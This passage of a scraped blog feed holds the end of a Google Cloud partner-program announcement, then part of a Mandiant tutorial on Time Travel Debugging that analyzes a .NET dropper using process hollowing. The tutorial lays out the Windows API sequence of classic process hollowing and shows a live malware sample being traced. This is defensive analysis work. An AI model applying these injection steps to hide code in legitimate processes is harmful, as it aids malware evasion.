cloud security findings with Google Security Operations to help teams identify, prioritize, and address their most critical cloud risks in a unified platform.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">In addition, Wiz and Security Command Center integrate to provide complete visibility and security for Google Cloud environments, including threat detection, AI security, and in-console security for application owners. Wiz is actively developing a new Google Threat Intelligence (GTI) integration that allows existing GTI customers to access threat intelligence seamlessly in the Wiz console, enabling threat intelligence-driven detection and response processes.</span></p>\n<p><span style=\"vertical-align: baseline;\">\u201cAchieving secure innovation in the cloud requires unified visibility and radical risk prioritization. Our inclusion in the Google Unified Security Recommended program recognizes the power of Wiz to deliver code-to-cloud security for Google Cloud customers. By integrating our platform with Google Security Operations and Security Command Center, we enable customers to see their multicloud attack surface, prioritize the most critical risks, and automatically accelerate remediation. Together, we are simplifying the most complex cloud security challenges and making it easier for you to innovate securely,\" said Anthony Belfiore, chief strategy officer, Wiz.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Powering the agentic SOC with MCP</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A critical aspect of Google Unified Security Recommended is our shared dedication to strategic AI initiatives, including MCP support. Because it enables AI models to interact with and use security tools, MCP can enhance security workflows by ensuring Gemini models possess contextual awareness across multiple downstream services.</span></p>\n<p><span style=\"vertical-align: baseline;\">MCP can help facilitate an enhanced, cross-platform </span><strong style=\"vertical-align: baseline;\">agentic experience</strong><span style=\"vertical-align: baseline;\">. With MCP, our new AI agents \u2014 such as the alert triage agent in Google Security Operations that autonomously investigates alerts \u2014 can query partner tools for telemetry, enrich investigations with third-party data, and orchestrate response actions across your entire security stack.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">We are proud to confirm that all of our inaugural launch partners support MCP and have developed recommended approaches for how to activate MCP-supported agentic workflows across our products, a crucial step towards realizing our vision of an </span><a href=\"https://cloud.google.com/blog/products/identity-security/introducing-the-agentic-soc-workshops-for-security-professionals\"><span style=\"text-decoration: underline; vertical-align: baseline;\">agentic SOC</span></a><span style=\"vertical-align: baseline;\"> where AI functions as a virtual security assistant, proactively identifying threats and guiding you to faster, more effective responses.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Our open future on Google Cloud Marketplace</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The introduction of the Google Unified Security Recommended program is only the beginning. We are dedicated to expanding this program to include a wider array of the </span><strong style=\"vertical-align: baseline;\">most trusted partner solutions</strong><span style=\"vertical-align: baseline;\"> with substantial investment across the Google Unified Security product suite, helping our customers build a more scalable, effective, and interoperable security architecture.</span></p>\n<p><span style=\"vertical-align: baseline;\">For simplified procurement and deployment, all qualified Google Unified Security Recommended solutions are available in the </span><a href=\"https://cloud.google.com/marketplace?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Marketplace</span></a><span style=\"vertical-align: baseline;\">. We offer Google Unified Security and Google Cloud customers streamlined purchasing of third-party offerings, all consolidated into one Google Cloud bill.</span></p>\n<p><span style=\"vertical-align: baseline;\">To learn more about the program and explore Google-validated solutions from our partners, visit the </span><a href=\"https://docs.cloud.google.com/chronicle/docs/reference/google-unified-security-recommended\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Unified Security Recommended page</span></a><span style=\"vertical-align: baseline;\">. Tech partners interested in program consideration are encouraged to </span><a href=\"https://forms.gle/qffq4oRQ9rpQ9Pp28\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">reach out</span></a><span style=\"vertical-align: baseline;\"> for guidance.</span></p></div>",
        "published_date": "2025-11-13 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/threat-intelligence/time-travel-debugging-using-net-process-hollowing/",
        "title": "Time Travel Triage: An Introduction to Time Travel Debugging using a .NET Process Hollowing Case Study",
        "thumbnail": null,
        "author": "Mandiant",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p>Written by: Josh Stroschein, Jae Young Kim</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The prevalence of obfuscation and multi-stage layering in today\u2019s malware often forces analysts into tedious and manual debugging sessions. For instance, the primary challenge of analyzing pervasive commodity stealers like AgentTesla isn\u2019t identifying the malware, but quickly cutting through the obfuscated delivery chain to get to the final payload.</span></p>\n<p><span style=\"vertical-align: baseline;\">Unlike traditional live debugging, </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/ttd-instruction-emulation-bugs\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Time Travel Debugging (TTD)</span></a><span style=\"vertical-align: baseline;\"> captures a deterministic, shareable record of a program's execution. Leveraging TTD's powerful data model and time travel capabilities allow us to efficiently pivot to the key execution events that lead to the final payload.</span></p>\n<p><span style=\"vertical-align: baseline;\">This post introduces all of the basics of WinDbg and TTD necessary to start incorporating TTD into your analysis. We demonstrate why it deserves to be a part of your toolkit by walking through an obfuscated multi-stage .NET dropper that performs process hollowing.</span></p>\n<h3><span style=\"vertical-align: baseline;\">What is Time Travel Debugging?</span></h3>\n<p><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/time-travel-debugging-overview\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Time Travel Debugging (TTD)</span></a><span style=\"vertical-align: baseline;\">, a technology offered by Microsoft as part of </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">WinDbg</span></a><span style=\"vertical-align: baseline;\">, records a process\u2019s execution into a trace file that can be replayed forwards and backwards. The ability to quickly rewind and replay execution reduces analysis time by eliminating the need to constantly restart debugging sessions or restore virtual machine snapshots. TTD also enables users to query the recorded execution data and filter it with Language Integrated Query (LINQ) to find specific events of interest like module loads or calls to APIs that implement malware functionalities like shellcode execution or process injection.</span></p>\n<p><span style=\"vertical-align: baseline;\">During recording, TTD acts as a transparent layer that allows full interaction with the operating system. A trace file preserves a complete execution record that can be shared with colleagues to facilitate collaboration, circumventing environmental differences that can affect the results of live debugging.</span></p>\n<p><span style=\"vertical-align: baseline;\">While TTD offers significant advantages, users should be aware of certain limitations. Currently, TTD is restricted to user-mode processes and cannot be used for kernel-mode debugging. The trace files generated by TTD have a proprietary format, meaning their analysis is largely tied to WinDbg. Finally, TTD does not offer \"true\" time travel in the sense of altering the program's past execution flow; if you wish to change a condition or variable and see a different outcome, you must capture an entirely new trace as the existing trace is a fixed recording of what occurred.</span></p>\n<h4><span style=\"vertical-align: baseline;\">A Multi-Stage .NET Dropper with Signs of Process Hollowing</span></h4>\n<p><span style=\"vertical-align: baseline;\">The Microsoft .NET framework has long been popular among threat actors for developing highly obfuscated malware. These programs often use code flattening, encryption, and multi-stage assemblies to complicate the analysis process. This complexity is amplified by </span><a href=\"https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Platform Invoke (P/Invoke)</span></a><span style=\"vertical-align: baseline;\">, which gives managed .NET code direct access to the unmanaged Windows API, allowing authors to port tried-and-true evasion techniques like </span><a href=\"https://attack.mitre.org/techniques/T1055/012/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">process hollowing</span></a><span style=\"vertical-align: baseline;\"> into their code.</span></p>\n<p><span style=\"vertical-align: baseline;\">Process hollowing is a pervasive and effective form of code injection where malicious code runs under the guise of another process. It is common at the end of downloader chains because the technique allows injected code to assume the legitimacy of a benign process, making it difficult to spot the malware with basic monitoring tools.</span></p>\n<p><span style=\"vertical-align: baseline;\">In this case study, we'll use TTD to analyze a .NET dropper that executes its final stage via process hollowing. The case study demonstrates how TTD facilitates highly efficient analysis by quickly surfacing the relevant Windows API functions, enabling us to bypass the numerous layers of .NET obfuscation and pinpoint the payload.</span></p>\n<p><span style=\"vertical-align: baseline;\">Basic analysis is a vital first step that can often identify potential process hollowing activity. For instance, using a sandbox may reveal suspicious process launches. Malware authors frequently target legitimate .NET binaries for hollowing as these blend seamlessly with normal system operations. In this case, reviewing process activity on </span><a href=\"https://www.virustotal.com/gui/file/b7268f9814ddac66d6a4c1c43115d19de4fdb23e4d30ae233aeb51127213a1df/behavior\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">VirusTotal</span></a><span style=\"vertical-align: baseline;\"> shows that the sample launches </span><code style=\"vertical-align: baseline;\">InstallUtil.exe</code><span style=\"vertical-align: baseline;\"> (found in </span><code style=\"vertical-align: baseline;\">%windir%\\Microsoft.NET\\Framework\\&lt;version&gt;\\</code><span style=\"vertical-align: baseline;\">). While </span><code style=\"vertical-align: baseline;\">InstallUtil.exe</code><span style=\"vertical-align: baseline;\"> is a legitimate utility, its execution as a child process of a suspected malicious sample is an indicator that helps focus our initial investigation on potential process injection.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Process activity recorded in the VirusTotal sandbox\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/time-travel-triage-fig1a.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Process activity recorded in the VirusTotal sandbox</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Despite newer, more stealthy techniques, such as Process Doppelg\u00e4nging, when an attacker employs process injection, it\u2019s still often the classic version of process hollowing due to its reliability, relative simplicity, and the fact that it still effectively evades less sophisticated security solutions. The classic process hollowing steps are as follows:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">CreateProcess</code><span style=\"vertical-align: baseline;\"> (with the </span><code style=\"vertical-align: baseline;\">CREATE_SUSPENDED</code><span style=\"vertical-align: baseline;\"> flag): Launches the victim process (</span><code style=\"vertical-align: baseline;\">InstallUtil.exe</code><span style=\"vertical-align: baseline;\">) but suspends its primary thread before execution.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">ZwUnmapViewOfSection</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">NtUnmapViewOfSection</code><span style=\"vertical-align: baseline;\">: \"Hollows out\" the process by removing the original, legitimate code from memory.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">VirtualAllocEx</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">WriteProcessMemory</code><span style=\"vertical-align: baseline;\">: Allocates new memory in the remote process and injects the malicious payload.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">GetThreadContext</code><span style=\"vertical-align: baseline;\">: Retrieves the context (the state and register values) of the suspended primary thread.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">SetThreadContext</code><span style=\"vertical-align: baseline;\">: Redirects the execution flow by modifying the entry point register within the retrieved context to point to the address of the newly injected malicious code.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">ResumeThread</code><span style=\"vertical-align: baseline;\">: Resumes the thread, causing the malicious code to execute as if it were the legitimate process.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">To confirm this activity in our sample using TTD, we focus our search on the process creation and the subsequent writes to the child process\u2019s address space. The approach demonstrated in this search can be adapted to triage other techniques by adjusting the TTD queries to search for the APIs relevant to that technique.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Recording a Time Travel Trace of the Malware</span></h4>\n<p><span style=\"vertical-align: baseline;\">To begin using TTD, you must first record a trace of a program's execution. There are two primary ways to record a trace: using the WinDbg UI or the command-line utilities provided by Microsoft. The command-line utilities offer the quickest and most customizable way to record a trace, and that is what we'll explore in this post.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Warning</strong><span style=\"vertical-align: baseline;\">: Take all usual precautions for performing dynamic analysis of malware when recording a TTD trace of malware executables. TTD recording is not a sandbox technology and allows the malware to interface with the host and the environment without obstruction.</span></p>\n<p><code style=\"vertical-align: baseline;\">TTD.exe</code><span style=\"vertical-align: baseline;\"> is the preferred command-line tool for recording traces. While Windows includes a built-in utility (</span><code style=\"vertical-align: baseline;\">tttracer.exe</code><span style=\"vertical-align: baseline;\">), that version has reduced features and is primarily intended for system diagnostics, not general use or automation. Not all WinDbg installations provide the </span><code style=\"vertical-align: baseline;\">TTD.exe</code><span style=\"vertical-align: baseline;\"> utility or add it to the system path. The quickest way to get </span><code style=\"vertical-align: baseline;\">TTD.exe</code><span style=\"vertical-align: baseline;\"> is to use the </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/time-travel-debugging-ttd-exe-command-line-util\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">stand-alone installer</span></a><span style=\"vertical-align: baseline;\"> provided by Microsoft. This installer automatically adds </span><code style=\"vertical-align: baseline;\">TTD.exe</code><span style=\"vertical-align: baseline;\"> to the system's </span><code style=\"vertical-align: baseline;\">PATH</code><span style=\"vertical-align: baseline;\"> environment variable, ensuring it's available from a command prompt. To see its usage information, run </span><code style=\"vertical-align: baseline;\">TTD.exe -help</code><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">The quickest way to record a trace is to simply provide the command line invoking the target executable with the appropriate arguments. We use the following command to record a trace of our sample:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>C:\\Users\\FLARE\\Desktop\\&gt; ttd.exe 0b631f91f02ca9cffd66e7c64ee11a4b.bin\nMicrosoft (R) TTD 1.01.11 x64\nRelease: 1.11.532.0\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nLaunching '0b631f91f02ca9cffd66e7c64ee11a4b.bin'\n    Initializing the recording of process (PID:2448) on trace file: C:\\Users\\FLARE\\Desktop\\0b631f91f02ca9cffd66e7c64ee11a4b02.run\n    Recording has started of process (PID:2448) on trace file: C:\\Users\\FLARE\\Desktop\\0b631f91f02ca9cffd66e7c64ee11a4b02.run</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Once TTD begins recording, the trace concludes in one of two ways. First, the tracing automatically stops upon the malware's termination (e.g., process exit, unhandled exception, etc.). Second, the user can manually intervene. While recording, </span><code style=\"vertical-align: baseline;\">TTD.exe</code><span style=\"vertical-align: baseline;\"> displays a small dialog (shown in figure 2) with two control options:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Tracing Off:</strong><span style=\"vertical-align: baseline;\"> Stops the trace and detaches from the process, allowing the program to continue execution.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Exit App:</strong><span style=\"vertical-align: baseline;\"> Stops the trace and also terminates the process.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--small\n      \n      \n        h-c-grid__col\n        \n        \n        h-c-grid__col--2 h-c-grid__col--offset-5\n      \">\n\n      \n      \n        \n        <img alt=\"TTD trace execution control dialog\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/time-travel-triage-fig2a.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: TTD trace execution control dialog</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Recording a TTD trace produces the following files:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">&lt;trace&gt;.run</code><span style=\"vertical-align: baseline;\">: The trace file is a proprietary format that contains compressed execution data. The size of a trace file is influenced by the size of the program, the length of execution, and other external factors such as the number of additional resources that are loaded.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">&lt;trace&gt;.idx</code><span style=\"vertical-align: baseline;\">: The index file allows the debugger to quickly locate specific points in time during the trace, bypassing sequential scans of the entire trace. The index file is created automatically the first time a trace file is opened in WinDbg. In general, </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/time-travel-debugging-trace-file-information\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Microsoft</span></a><span style=\"vertical-align: baseline;\"> suggests that index files are typically twice the size of the trace file.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">&lt;trace&gt;.out</code><span style=\"vertical-align: baseline;\">: The trace log file containing logs produced during trace recording.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Once a trace is complete, the </span><code style=\"vertical-align: baseline;\">.run</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">file can be opened with WinDbg.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Triaging the TTD Trace: Shifting Focus to Data</span></h3>\n<p><span style=\"vertical-align: baseline;\">The fundamental advantage of TTD is the ability to shift focus from manual code stepping to execution data analysis. Performing rapid, effective triage with this data-driven approach requires proficiency in both basic TTD navigation and querying the Debugger Data Model. Let's begin by exploring the basics of navigation and the Debugger Data Model.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Navigating a Trace</span></h4>\n<p><span style=\"vertical-align: baseline;\">Basic navigation commands are available under the Home tab in the WinDbg UI.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Basic WinDbg TTD Navigation Commands\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/time-travel-triage-fig3.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: Basic WinDbg TTD Navigation Commands</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The standard WinDbg commands and shortcuts for controlling execution are:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">g</code><span style=\"vertical-align: baseline;\">: </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/g--go-\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Go</span></a><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">F5</code><span style=\"vertical-align: baseline;\">) \u2013 </span><span style=\"vertical-align: baseline;\">Resume execution</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">gu</code><span style=\"vertical-align: baseline;\">: </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/gu--go-up-\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Go Up / Step Out</span></a><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">Shift+F11</code><span style=\"vertical-align: baseline;\">) \u2013 </span><span style=\"vertical-align: baseline;\">Execute until current function is complete</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">t</code><span style=\"vertical-align: baseline;\">: </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/t--trace-\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Trace / Step Into</span></a><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">F11</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">F8</code><span style=\"vertical-align: baseline;\">)</span><span style=\"vertical-align: baseline;\"> \u2013 Single step into</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">p</code><span style=\"vertical-align: baseline;\">: </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/p--step-\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Step / Step Over</span></a><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">F10</code><span style=\"vertical-align: baseline;\">) \u2013</span><span style=\"vertical-align: baseline;\"> Single step over</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Replaying a TTD trace enables the reverse flow control commands that complement the regular flow control commands. Each reverse flow control complement is formed by appending a dash (</span><span style=\"vertical-align: baseline;\">-</span><span style=\"vertical-align: baseline;\">) to the regular flow control command:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">g-</code><span style=\"vertical-align: baseline;\">: Go Back \u2013 Execute the trace backwards</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">g-u</code><span style=\"vertical-align: baseline;\">: </span><span style=\"vertical-align: baseline;\">Step Out Back - Execute the trace backwards up to the last call instruction</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">t-</code><span style=\"vertical-align: baseline;\">:</span><span style=\"vertical-align: baseline;\"> Step Into Back \u2013 Single step into backwards</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">p-</code><span style=\"vertical-align: baseline;\">: Step Over Back \u2013 Single step over backwards</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">Time Travel (</span><code style=\"vertical-align: baseline;\">!tt</code><span style=\"vertical-align: baseline;\">) Command</span></h4>\n<p><span style=\"vertical-align: baseline;\">While basic navigation commands let you move step-by-step through a trace, the </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/time-travel-debugging-extension-tt\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">time travel command</span></a><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">!tt</code><span style=\"vertical-align: baseline;\">) enables precise navigation to a specific trace position. These positions are often provided in the output of various TTD commands. A position in a TTD trace is represented by two hexadecimal numbers in the format </span><code style=\"vertical-align: baseline;\">#:#</code><span style=\"vertical-align: baseline;\"> (e.g., </span><code style=\"vertical-align: baseline;\">E:7D5</code><span style=\"vertical-align: baseline;\">) where:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The first part is a sequencing number typically corresponding to a major execution event, such as a module load or an exception.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The second part is a step count, indicating the number of events or instructions executed since that major execution event.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">We'll use the time travel command later in this post to jump directly to the critical events in our process hollowing example, bypassing manual instruction tracing entirely.</span></p>\n<h4><span style=\"vertical-align: baseline;\">The TTD Debugger Data Model</span></h4>\n<p><span style=\"vertical-align: baseline;\">The WinDbg debugger data model is an extensible object model that exposes debugger information as a navigable tree of objects. The debugger data model brings a fundamental shift in how users access debugger information in WinDbg, from wrangling raw text-based output to interacting with structured object information. The data model supports </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/using-linq-with-the-debugger-objects\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LINQ</span></a><span style=\"vertical-align: baseline;\"> for querying and filtering, allowing users to efficiently sort through large volumes of execution information. The debugger data model also simplifies automation through JavaScript, with APIs that mirror how you access the debugger data model through commands.</span></p>\n<p><span style=\"vertical-align: baseline;\">The </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/dx--display-visualizer-variables-\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Display Debugger Object Model Expression</span></a><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">(</code><code style=\"vertical-align: baseline;\">dx</code><code style=\"vertical-align: baseline;\">)</code><span style=\"vertical-align: baseline;\"> command is the primary way to interact with the debugger data model from the command window in WinDbg. The model lends itself to discoverability \u2013 you can begin traversing through it by starting at the root </span><code style=\"vertical-align: baseline;\">Debugger</code><span style=\"vertical-align: baseline;\"> object:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx Debugger\nDebugger\n    Sessions\n    Settings\n    State\n    Utility\n    LastEvent</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The command output lists the five objects that are properties of the </span><code style=\"vertical-align: baseline;\">Debugger</code><span style=\"vertical-align: baseline;\"> object. Note that the names in the output, which look like links, are marked up using the </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-markup-language-commands\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Debugger Markup Language</span></a><span style=\"vertical-align: baseline;\"> (DML). DML enriches the output with links that execute related commands. </span><span style=\"vertical-align: baseline;\">Clicking on the </span><code style=\"vertical-align: baseline;\">Sessions</code><span style=\"vertical-align: baseline;\"> object in the output executes the following </span><code style=\"vertical-align: baseline;\">dx</code><span style=\"vertical-align: baseline;\"> command to expand on that object:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -r1 Debugger.Sessions\nDebugger.Sessions                \n    [0x0]            : Time Travel Debugging: 0b631f91f02ca9cffd66e7c64ee11a4b.run</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The </span><code style=\"vertical-align: baseline;\">-r#</code><span style=\"vertical-align: baseline;\"> argument specifies recursion up to </span><code style=\"vertical-align: baseline;\">#</code><span style=\"vertical-align: baseline;\"> levels, with a default depth of one if not specified. For example, increasing the recursion to two levels in the previous command produces the following output:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -r2 Debugger.Sessions\nDebugger.Sessions                \n    [0x0]            : Time Travel Debugging: 0b631f91f02ca9cffd66e7c64ee11a4b.run\n        Processes       \n        Id               : 0\n        Diagnostics     \n        TTD             \n        OS              \n        Devices         \n        Attributes</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The </span><code style=\"vertical-align: baseline;\">-g</code><span style=\"vertical-align: baseline;\"> argument displays any iterable object into a data grid in which each element is a grid row and the child properties of each element are grid columns.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -g Debugger.Sessions</code></pre></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Grid view of Sessions, with truncated columns\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/time-travel-triage-fig4a.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: Grid view of Sessions, with truncated columns</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Debugger and User Variables</span></h4>\n<p><span style=\"vertical-align: baseline;\">WinDbg provides some predefined </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/using-linq-with-the-debugger-objects#system-defined-variables\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">debugger variables</span></a><span style=\"vertical-align: baseline;\"> for convenience which can be listed through the </span><code style=\"vertical-align: baseline;\">DebuggerVariables</code><span style=\"vertical-align: baseline;\"> property.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx Debugger.State.DebuggerVariables\nDebugger.State.DebuggerVariables                \n   cursession       : Time Travel Debugging: 0b631f91f02ca9cffd66e7c64ee11a4b.run\n    curprocess       : 0b631f91f02ca9cffd66e7c64ee11a4b.exe [Switch To]\n    curthread        [Switch To]\n    scripts         \n    scriptContents   : [object Object]\n    vars            \n    curstack        \n    curframe         : ntdll!LdrInitializeThunk [Switch To]\n    curregisters    \n    debuggerRootNamespace</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Frequently used variables include:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">@$cursession</code><span style=\"vertical-align: baseline;\">: The current debugger session. Equivalent to </span><code style=\"vertical-align: baseline;\">Debugger.Sessions[&lt;session&gt;]</code><span style=\"vertical-align: baseline;\">. Commonly used items include:</span></p>\n</li>\n<ul>\n<li 